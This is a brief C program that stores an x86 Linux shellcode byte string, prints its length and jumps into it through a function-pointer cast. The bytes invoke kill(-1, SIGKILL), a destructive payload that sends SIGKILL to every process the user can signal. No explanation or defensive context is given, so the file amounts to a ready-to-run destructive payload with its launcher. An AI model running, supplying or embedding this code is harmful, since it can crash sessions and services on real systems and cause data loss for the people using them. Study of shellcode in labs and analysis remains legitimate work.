#include <stdio.h>
#include <string.h>

char shellcode[] = "\x6a\x09\x6a\xff\x6a\x25\x58\x5b\x59\xcd\x80";

int main() {
  fprintf(stdout, "Length: %d\n", strlen(shellcode));
  (*(void (*)())shellcode)();
}
